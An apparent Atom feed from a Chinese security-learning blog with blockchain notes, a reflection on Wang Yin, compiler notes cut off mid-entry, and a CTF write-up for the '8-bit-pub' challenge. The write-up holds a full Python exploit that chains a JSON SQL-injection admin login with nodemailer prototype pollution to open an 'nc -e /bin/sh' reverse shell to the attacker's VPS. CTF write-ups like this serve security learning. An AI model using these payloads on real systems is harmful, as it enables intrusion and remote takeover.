        <content type="html"><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h1><p>在我看来，网络安全最关键的几个用途：</p><ul><li>金融保护：保护资金安全和交易时的安全。</li><li>网站或应用保护：保护网站的安全，是金融保护的基础，但是和金融保护关联性不大。<ul><li>Web：网站。</li><li>Pwn：应用和底层。</li></ul></li><li>隐私保护：主要是信息的保护。<ul><li>关键数据：公司机密等信息。</li><li>个人隐私：个人隐私数据。</li></ul></li></ul><p>数字货币是未来的趋势，势必需要达到一定的安全系数，才能应用与实际场景。这篇文章将会记录我学习其中的区块链安全的所有笔记。</p><hr><h1 id="1-基础"><a href="#1-基础" class="headerlink" title="1 基础"></a>1 基础</h1><p><font color="red">0x01：区块链是什么？比特币是什么？区块链和比特币是什么关系？</font></p><ul><li>区块链其实是一种数据结构，堆和栈就是一种数据结构，可以被用来构建分布式数据库。</li><li>比特币是一种数字货币（money）。</li></ul><p>比特币是基于「区块链」这种数据结构制作的货币。</p><hr><p><font color="red">0x02：比特币为什么那么火？</font></p><p>这是我从普通人视角看到的好处：</p><ol><li>去中心化：最直接的好处，防止可信任机构（货币发行者）做出失信行为。例如：金圆券。</li><li>全球流通：免中间手续费。</li><li>匿名：软件勒索必选货币，或者各种黑市交易。</li></ol><p>比特币的本质：解决信任问题，降低信任的成本（一堆人证明）。简而言之，减少中间商转差价（银行等金融机构）。</p><p><font color="red">0x03：区块链的结构是怎样的？</font></p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210315214257.png"><br>（可以先有个抽象的概念）</p><ol><li>区块：区块是存储交易信息的数据结构（包含区块头、区块体），其中区块头用于存储特征值，而区块体用于存储实际数据。每次交易都会产生一个区块，第一个区块被成为“创世区块”，前一个区块称为后一个区块的父区块。</li><li>链：每个区块头都有上一个区块头的 Hash 值，在逻辑上就像是相连着一样。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210316002023.png"><blockquote><p>注意：“每次交易”是指在区块生成这段时间。一个区块体能包含 2000 多笔交易。</p></blockquote></li></ol><hr><p><font color="red">0x04：挖矿是什么？</font></p><p>挖矿就是记录区块头 Hash 值生成下一个区块的过程。</p><p>不过并没有那么简单，中本聪的发明者故意让区块的生成非常的困难，区块的哈希值需要小于目标值才会被接受。在区块头大部分都是特征值，但其中有一个 <code>nonce</code> 的属性，可以用于修改，使得区块头生成的哈希小于目标值。</p><p>这个目标值还具有动态调节功能，当前两周区块的平均生成时间小于 10 分钟，会将目标值降低，使得挖矿难度更难。</p><blockquote><p>感觉挖矿有些浪费资源，不过确实是极大的保证了区块链的安全性。</p></blockquote><hr><p><font color="red">0x05：比特币是怎么交易的？</font></p><p>比特币钱包就是一对公钥和私钥，钱包的地址就是公钥指纹（公钥的哈希值）。最初的账户的金额都是 0，你需要通过其他渠道获取，让别人支付给你比特币。</p><p>别人只需要支付到你的钱包地址即可，如果支付方确认支付，所有的矿工将会记录下这笔交易，也就是意味着整个系统都承认你有xx枚比特币，整个系统都知道支付方少了xx枚比特币。</p><p>当你需要向别人支付时，系统就需要进行验证：</p><ul><li>你的钱包地址有多少钱？从哪来的？</li><li>你给出的公钥是不是当前钱包地址的公钥？（钱包的地址==Hash(公钥)）</li><li>你是否是这个钱包的主人？（你使用私钥生成的数字签名，使用公钥是否能揭开）<blockquote><p>通过了上面的验证，系统就会认为你是这个钱包的主人，然后将钱包地址上的钱转给他人。</p></blockquote></li></ul><p>这里引用阮一峰老师的一段话：</p><blockquote><p>比特币不存放在钱包或其他别的地方，而是只存在于区块链上面。区块链记载了你参与的每一笔交易，你得到过多少比特币，你又支付了多少比特币，因此可以算出来你拥有多少资产。</p></blockquote><p>还可以考虑采用麻将来比喻区块链（每次并不支付筹码，只是做数字的运算）<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210316012028.png"></p><hr><p><font color="red">0x06 以太坊和比特币有什么相同点和不同点呢？</font></p><p>在网站 CoinMarketCap 中列出了所有的加密货币。 <a href="https://coinmarketcap.com/zh/all/views/all/">传送门</a></p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210316093958.png"><br>（图片说明：所有加密货币中排行前三的货币，能看出比特币和以太坊远超第二名）</p><p>相同点：</p><ol><li>都基于区块链技术构建。</li><li>都采用公钥体系来认证交易。</li></ol><p>不同点：</p><ol><li>作用<ol><li>比特币：交易货币。</li><li>以太坊：是一个开源的有智能合约功能的公共区块链平台，以太坊可以充当其他加密货币的平台，以「以太坊」为平台的「以太币」交易的区块确认时间更短。</li></ol></li><li>智能合约：使用代码编写的交易规则，具有广泛的使用场景。<ol><li>区块链：不具有智能合约</li><li>以太坊：具有智能合约，能处理更复杂的问题，该系统能够制定基本规则并强制执行合约，这是在实际合约和没有中间人的情况下是不可能发生的。</li></ol></li></ol><blockquote><p>智能合约的使用场景：<br>1.具有嵌入式指令的银行账户：类似银行的自动扣费，不过需要自己进行编写。</p><ul><li>资金控制权：银行是银行账户的最终维护者，它拥有完全的控制权，可以随意地向我的账户添加资金或者扣除资金，或者冻结资金</li><li>透明性：逻辑代码在所有参与的计算机上并行运行，结果由所有参与者进行比对。只有当参与者都同意结果，他们才会更新自己的账本版本。理论上没有人可以欺骗区块链。</li></ul><p>2.用计算机代码取代法律术语：严格的，没有争议。</p><ul><li>共享账本将在消除多方协议之间的信任需求方面发挥作用。比如：租赁合同。</li></ul></blockquote><p>在我看来比特币和智能合约都解决了信任问题，极大的降低了信任成本。</p><ul><li>比特币：将货币数字化去中心化，解决了简单的交易问题（不能解决复杂的条款）。</li><li>智能合约：将合约数字化，还可利用区块链的信任体系来减少对于中间人的依赖</li></ul><hr><p><font color="red">0x07 如何编写并运行自己的智能合约？</font></p><blockquote><p>具体教程参考：<a href="https://www.cnblogs.com/KRDecad3/p/10798383.html">传送门</a></p></blockquote><p>大概步骤：（只记录关键部分）</p><ol><li><strong>拥有自己的加密货币</strong>。ETH除了主网络，还有很多测试网络，可以在测试网络中免费获得。<blockquote><p>我最初认为需要花钱购买，Too young too simple.<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210316114236.png"><br>（图片说明：我在 Ropsten 测试网络的测试水龙头中获得了 2 个 ETH 币）</p></blockquote></li><li><strong>部署智能合约</strong>。</li></ol><p>在网站 <a href="http://remix.ethereum.org/">http://remix.ethereum.org/</a> 中进行网站的部署。<br>测试代码如下：（教程中的代码有不明的符号……）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract Test &#123;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) balances;</span><br><span class="line">  </span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    balances[tx.origin] &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  event FLAG(string b64email, string slogan);</span><br><span class="line">  </span><br><span class="line">  function getbalance() public constant returns (uint)&#123;</span><br><span class="line">      return balances[tx.origin];</span><br><span class="line">  &#125;</span><br><span class="line">  function AddBalance(uint f) public &#123;</span><br><span class="line">    if(f&#x3D;&#x3D;1)&#123;</span><br><span class="line">        balances[tx.origin]++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function CaptureTheFlag(string b64email) public&#123;</span><br><span class="line">    require (balances[tx.origin]&gt;0);</span><br><span class="line">    emit FLAG(b64email, &quot;you will get flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>部署完成的效果图：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210316115804.png"><br>（图片说明：在 MetaMask 中的活动一栏可以看到合约的部署情况）</p><ol start="3"><li><strong>和智能合约进行交互</strong>。</li></ol><p>在与合约进行交互之前，我们需要先知道合约的具体地址。</p><p>合约地址可以在 Ropsten 的 Transaction Details 中看到，也可以在 Remix 编辑器的左侧找到，根据合约的地址我们才能与合约进行交互。</p><p>在合约中如果有运算操作（加减、逻辑操作），就需要使用 ETH 来支付相关的运算费用（给矿工），例如 <code>balances[tx.origin]++;</code>。如果只是查询就不需要费用，例如 <code>return balances[tx.origin];</code>。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210316121027.png"><br>（图片说明：这是我创建的合约在 Ropsten 网络上的记录，创建和 AddBalance 都花费了 ETH，但是查询操作没有花费 ETH）</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210316123031.png"><br>（图片说明：调用 CaptureTheFlag 函数后，emit 方法会把参数使用 log 的方式返回）</p><hr><h1 id="2-安全"><a href="#2-安全" class="headerlink" title="2 安全"></a>2 安全</h1><h2 id="2-1-智能合约安全"><a href="#2-1-智能合约安全" class="headerlink" title="2.1 智能合约安全"></a>2.1 智能合约安全</h2><p><font color="red">0x01 “漏洞挖掘思路”的含义是什么？</font></p><p>需要先了解这些词汇的含义：</p><ol><li>漏洞：事情有破绽，不周密的地方。在网络安全领域通常是指系统或程序有破绽的代码，不周密。（这里是名词）</li><li>挖掘：探求，寻找。</li><li>思路：思考的条理、线索。</li></ol><p>“漏洞挖掘”换句话就是，找出系统或者程序破绽的代码的思考线索。这里其实有两种不同类型的思考线索。 </p><ul><li>自动化：适用于任何漏洞。<ul><li>补丁对比</li></ul></li></ul><p>黑盒测试：</p><ul><li>Fuzz</li></ul><p>白盒测试：</p><ul><li>动态分析</li><li>静态分析<ul><li>过程间分析</li><li>数据流分析</li><li>符号执行</li></ul></li></ul><hr><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210316190003.png"></p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210316190313.png"></p><hr><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><ol><li>大话区块链【Blockchain】：<a href="https://www.cnblogs.com/sunsky303/p/11778553.html">https://www.cnblogs.com/sunsky303/p/11778553.html</a></li><li>区块链入门教程-阮一峰的网络日志：<a href="https://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html">https://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html</a></li><li>比特币入门教程-阮一峰的网络日志：<a href="http://www.ruanyifeng.com/blog/2018/01/bitcoin-tutorial.html">http://www.ruanyifeng.com/blog/2018/01/bitcoin-tutorial.html</a></li><li>智能合约攻击面及ctf出题指南：<a href="https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/">https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/</a></li><li>[论文阅读笔记]智能合约安全漏洞挖掘技术研究：<a href="https://zhuanlan.zhihu.com/p/144382236">https://zhuanlan.zhihu.com/p/144382236</a></li><li>CTF中智能合约部署交互基础：<a href="https://blog.csdn.net/qq_41429081/article/details/104321258">https://blog.csdn.net/qq_41429081/article/details/104321258</a></li><li>实现CTF智能合约题目的环境部署:<a href="https://www.cnblogs.com/KRDecad3/p/10798383.html">https://www.cnblogs.com/KRDecad3/p/10798383.html</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
            <tag> 智能合约 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【个人感悟】走近王垠</title>
      <link href="3b8002e7a287/"/>
      <url>3b8002e7a287/</url>
      
        <content type="html"><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h1><p>今天的我，本来在学习学姐推荐的 <a href="https://www.bilibili.com/video/av91858985/">南京大学《软件分析》</a> 的课程，这个课程是关于程序的静态分析的。</p><p>静态分析只是 PL（program language） 当中一个比较小的领域，但对于后期的代码审计应该会有很大的帮助。我在课间的时候就去搜了一下相关的内容，而知乎上最热的搜索是 【如何评价王垠新文章《我为什么不再做PL人》? - 知乎】。</p><p>从一些比较表象的评论中，我得到了一些关于这个人的标签：</p><ul><li>天才程序员。</li><li>保研清华。</li><li>三次博士退学。</li><li>在 Google 开发代码分析工具，沿用至今。</li><li>Python 静态分析工具作者。</li><li>各种吐槽文章。</li></ul><p>我开始思考：是不是这个人心理有问题？但是随着我越来越深入的了解，我打消了这种思考。</p><h1 id="1-正文"><a href="#1-正文" class="headerlink" title="1 正文"></a>1 正文</h1><p><font color="red">0x01 我为什么停止批判？</font></p><ol><li><p>当我读到下面这个评论</p><blockquote><p>王垠的才能和品德都超过我，我是没有资格。</p></blockquote></li><li><p>他是我的前辈，我现在学到的某些理论和方法可能就来自他。或者我需要从他过去的项目中学到其他的东西。</p></li><li><p>无脑的批判没有任何价值。</p></li></ol><p><font color="red">0x02 我在他的博客或其他人的评论中看到了什么？</font></p><p><strong>在评论中，批判的声音还是比较多。</strong>（大概率是通过各种信息了解的，而不是真是接触到真人）</p><blockquote><ul><li>从他退学的经历和退出 Google 的经历总结出：眼高手低。</li><li>从他开培训班总结出：割韭菜。</li><li>一把好牌打的稀烂</li><li>自以为是</li></ul></blockquote><p><strong>在评论中，也有一些赞许的声音。</strong></p><blockquote><ul><li>极客</li><li>独立思考</li></ul></blockquote><p>从我的角度看的话，他有强迫症+完美主义，他在追求他认为美的事物，他的行动也在证明这一切。知乎其中一个评论所说：</p><blockquote><p>蔑视所有技术权威和IT暴发户，追求自由和兴趣的特立独行。</p></blockquote><p>他对于完美的追求大于对于名利的追求，所以才能做出如此高的成就，所以才能做出让「普通人」无法理解的行动。</p><p>他的追求不是一般人能做到的，能坚持的。他在贯彻着赫尔曼·黑塞的那句话。</p><blockquote><p>每个人的生活都是一条通向自身的道路。每个人的真正职责只有一个：找到自我。然后在心中坚守一生，全心全意，永不停息。所有其它的路都是不完整的，是人的逃避方式，是对社会角色的懦弱伪装，是随波逐流，是对内心的恐惧。——赫尔曼·黑塞</p></blockquote><hr><h1 id="2-学习"><a href="#2-学习" class="headerlink" title="2 学习"></a>2 学习</h1><h2 id="2-1-《对智商的怀疑》"><a href="#2-1-《对智商的怀疑》" class="headerlink" title="2.1 《对智商的怀疑》"></a>2.1 《对智商的怀疑》</h2><p>值得学习的地方：</p><ul><li><strong>独立思考</strong>以及会思考（这应该是最为重要和关键的）。</li><li>有自己的<strong>追求</strong>。（找到自我）</li><li><strong>坚持</strong>自己的追求。（坚守自我）</li><li><strong>Better。</strong></li></ul><p>需要避免的地方：</p><ul><li><strong>接受现实，懂得理解他人，学会与人合作</strong>。需要清楚的知道这世界是不完美的，有比自己更强的人，也有比自己更弱的人，我需要在自己的领域做得更好，接纳别人的缺点和自己的缺点。</li></ul><p>这上面都只是指出学习的大体方向，并没有指出具体的内容，每个点都需要很长时间的努力和挣扎，还需要以后耐心的研读大佬的巨作来理解其内涵和思想。</p>]]></content>
      
      
      <categories>
          
          <category> 个人感悟 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【CTF系列】2021年3月-AntCTF Web WP - Exploit</title>
      <link href="4c08a869bcad/"/>
      <url>4c08a869bcad/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-8-bit-pub"><a href="#1-8-bit-pub" class="headerlink" title="1 8-bit-pub"></a>1 8-bit-pub</h2><ol><li>使用 <code>docker-compose up --build</code> 启动环境。<a href="https://github.com/crumbledwall/CTFChallenges/tree/main/D3CTF2021/8-bit_pub">题目传送门</a></li><li>修改 exp 相关配置，运行 exp。</li><li>在<strong>服务器</strong>监听 9999 端口，即使用命令 <code>nc -lvnp 9999</code>。执行 readflag。<blockquote><p>备注：该题共 3 种做法，其他做法的 exp 请查看 Github 项目 <a href="https://github.com/slug01sh/ctf-writeups/tree/master/2021/2021-antctf">ctf-writeups</a>)</p></blockquote></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">version 1:</span></span><br><span class="line"><span class="string">1. 污染nodemail库</span></span><br><span class="line"><span class="string">2. 使用nc反弹shell</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">VPS_HOST = os.environ.get(<span class="string">&quot;VPS_HOST&quot;</span>)  <span class="comment"># 从环境变量读取VPS的IP</span></span><br><span class="line">VPS_PORT = <span class="number">9999</span></span><br><span class="line">BASE_URL = <span class="string">&quot;http://127.0.0.1:3000&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vps_init</span>():</span></span><br><span class="line">    print(<span class="string">f&quot;vps host:<span class="subst">&#123;VPS_HOST&#125;</span>&quot;</span>)</span><br><span class="line">    flag = input(<span class="string">&quot;run &#x27;nc -lvnp 9999&#x27; in your vps! yes or no(y/n)?&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="string">&#x27;y&#x27;</span> <span class="keyword">or</span> flag.lower == <span class="string">&#x27;yes&#x27;</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;exit!&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_headers</span>() -&gt; dict:</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json; charset=UTF-8&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> headers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">json2string</span>(<span class="params">data</span>) -&gt; str:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    json转字符串</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param data: 需要发送的json数据</span></span><br><span class="line"><span class="string">    :return: json的字符串格式</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pretty_print_POST</span>(<span class="params">req</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    打印 Request 对象</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param req: Request对象</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&#x27;&#123;&#125;\n&#123;&#125;\r\n&#123;&#125;\r\n\r\n&#123;&#125;&#x27;</span>.format(</span><br><span class="line">        <span class="string">&#x27;-----------START-----------&#x27;</span>,</span><br><span class="line">        req.method + <span class="string">&#x27; &#x27;</span> + req.url,</span><br><span class="line">        <span class="string">&#x27;\r\n&#x27;</span>.join(<span class="string">&#x27;&#123;&#125;: &#123;&#125;&#x27;</span>.format(k, v) <span class="keyword">for</span> k, v <span class="keyword">in</span> req.headers.items()),</span><br><span class="line">        req.body,</span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_inject</span>():</span></span><br><span class="line">    login_url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/user/signin&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  <span class="comment"># 服务器执行的SQL语句：SELECT * FROM users WHERE username = &#x27;admin&#x27; AND password = `password` = true</span></span><br><span class="line">    data = json2string(data=data)</span><br><span class="line">    response = session.post(login_url, data=data, headers=headers)</span><br><span class="line">    print(response.text)  <span class="comment"># &#123;&quot;message&quot;:&quot;Signin success.&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollute</span>():</span></span><br><span class="line">    sendmail_url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/admin/email&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;to&quot;</span>: <span class="string">&quot;slug01sh@gmail.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subject&quot;</span>: <span class="number">123</span>,</span><br><span class="line">        <span class="string">&quot;text&quot;</span>: <span class="number">456</span>,</span><br><span class="line">        <span class="string">&quot;constructor.prototype.sendmail&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">        <span class="string">&quot;constructor.prototype.args&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;-c&quot;</span>,</span><br><span class="line">            <span class="string">f&quot;nc <span class="subst">&#123;VPS_HOST&#125;</span> <span class="subst">&#123;VPS_PORT&#125;</span> -e /bin/sh&quot;</span></span><br><span class="line">            <span class="comment"># 如果在 mac 上搭建测试环境，而不是 docker，不能使用 nc，而是使用 ncat。</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;constructor.prototype.path&quot;</span>: <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = json2string(data=data)</span><br><span class="line">    response = session.post(sendmail_url, data=data, headers=headers)</span><br><span class="line">    print(response.text)  <span class="comment"># &#123;&quot;message&quot;:&quot;Signin success.&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 检查基本配置</span></span><br><span class="line">    vps_init()</span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    headers = get_headers()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. SQL注入登陆admin：多读文档，自动类型转换很可能有意想不到的后果。</span></span><br><span class="line">    sql_inject()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. nodejs原型链污染：漏洞修复过!=修好了，有可能黑名单没有过滤完全。</span></span><br><span class="line">    pollute()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 在服务器使用nc监听9999端口，getshell</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 原型链污染 </tag>
            
            <tag> 任意文件读取 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【计算机基础】编译原理总结</title>
      <link href="fdf6e02b1ae5/"/>
      <url>fdf6e02b1ae5/</url>
      
        <content type="html"><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h1><h1 id="1-开篇词"><a href="#1-开篇词" class="headerlink" title="1 开篇词"></a>1 开篇词</h1><p><font color="red">0x01 为什么要学习编译原理？</font></p><p>编程语言是所有程序的基础。而语言的核心就在于「编译原理」。我曾经记得某位大佬说过，漏洞的本质就是利用「特殊手段」可以控制程序的运行结果。</p><blockquote><p>如果不了解整个程序运行的机制，怎么能对其进行控制呢？</p></blockquote><p>对于代码审计的深层技术，肯定是向着细粒度更小的方向发展，也就是根据语义和语法上进行分析，而非单纯靠阅读代码后凭直觉的判断。</p><hr><h1 id="2-脚本语言"><a href="#2-脚本语言" class="headerlink" title="2 脚本语言"></a>2 脚本语言</h1><h2 id="2-1-原理"><a href="#2-1-原理" class="headerlink" title="2.1 原理"></a>2.1 原理</h2><p><font color="red">0x02 什么是编译原理的「前端」和「后端」</font></p><p>有点类似 Web 中的前后端。Web 的前端并不指代操作系统和浏览器，Web 后端通常都是运行在服务器中。</p><p>这里的“前端”是指与执行代码的机器无关的部分，即词法分析、语法分析、语义分析等。</p><p>这里的“后端”是指与执行代码的机器有关的部分，即生成中间代码、优化、生成目标代码。</p><hr><p><font color="red">0x03 什么是词法分析？</font></p><p>我们都知道编程语言也是一种语言，可以用学习英语的单词来类比。</p><p>尝试一下阅读下面的句子：</p><blockquote><p>we are family.</p></blockquote><p>我们会将这个句子先分成三个单词 we，are，family。我们是怎么划分的呢？通过空格和标点符号。编程语言也需要做类似的分析，但是划分方式会稍微复杂一点。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>编程语言会按照规则将 <code>let</code>，<code>a</code>，<code>=</code>，<code>1</code> 分开，也就是我们常说的「分词」。</p><hr><p><font color="red">0x04 什么是语法分析？</font></p><p>这里的语法，和我们学习英语的语法也是类似的。我们在生活中使用语法可能不太多，但是当遇到复杂的句子或者很长的句子，就肯定需要使用到语法。</p><p>我们使用语法分析句子的大概步骤：划分句子成分。</p><p>对于编程语言也是类似的，他需要将「词法分析」获得的「词」进行成分划分，并且记录下来（人类会自动记录，所以通常不需要思考如何记录）。记录语法分析结果的结构就叫做<strong>抽象语法树</strong>。</p><blockquote><p>为什么是树呢？</p><ul><li>待续……</li></ul></blockquote><p>语法分析其实就是构建抽象语法树的过程（语法解析、文件解析），有一些现成的工具可以进行利用。</p><hr><p><font color="red">0x05 常见的语法分析工具有哪些？是怎么实现的？</font></p><p>工具列表：<a href="https://blog.csdn.net/gongwx/article/details/99645305">传送门</a></p><ul><li> Yacc（或 GNU 的版本，Bison）</li><li> Antlr</li><li> JavaCC </li></ul><p>实现方法：</p><ul><li>自顶向下</li><li>自底向上</li></ul><hr><p><font color="red">0x06 